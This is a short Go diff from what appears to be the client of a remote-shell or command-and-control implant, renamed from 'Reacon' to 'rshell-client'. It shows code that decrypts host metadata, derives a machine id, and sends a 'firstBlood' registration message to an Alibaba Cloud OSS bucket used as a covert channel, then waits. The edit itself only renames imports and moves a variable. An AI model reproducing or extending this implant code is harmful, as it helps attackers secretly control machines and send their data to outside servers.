@@ -1,15 +1,16 @@
 package communication
 
 import (
-	"Reacon/pkg/encrypt"
-	"Reacon/pkg/utils"
+	"rshell-client/shared/encrypt"
+	"rshell-client/shared/utils"
 	"fmt"
-	"github.com/aliyun/aliyun-oss-go-sdk/oss"
 	"io/ioutil"
 	"log"
 	"os"
 	"strings"
 	"time"
+
+	"github.com/aliyun/aliyun-oss-go-sdk/oss"
 )
 
 type Client struct {
@@ -54,13 +55,13 @@ func InitClient(endPoint, accessKeyId, accessKeySecret, bucketName string) error
 			utils.MetaInfo, _ = encrypt.EncodeBase64(utils.MetaInfo)
 			tmp, _ := encrypt.DecodeBase64(utils.MetaInfo)
 			tmp, _ = encrypt.Decrypt(tmp)
-			utils.Uid = encrypt.BytesToMD5(tmp)
+			Uid = encrypt.BytesToMD5(tmp)
 		}
 		firstBloodInt := 1
 		firstBloodBytes := utils.WriteInt(firstBloodInt)
 		firstBloodMsg := utils.BytesCombine(firstBloodBytes, utils.MetaInfo)
 
-		Send(Service, utils.Uid+fmt.Sprintf("/client_%020d", time.Now().UnixNano()), firstBloodMsg)
+		Send(Service, Uid+fmt.Sprintf("/client_%020d", time.Now().UnixNano()), firstBloodMsg)
 		time.Sleep(60 * time.Second)
 	}()
 
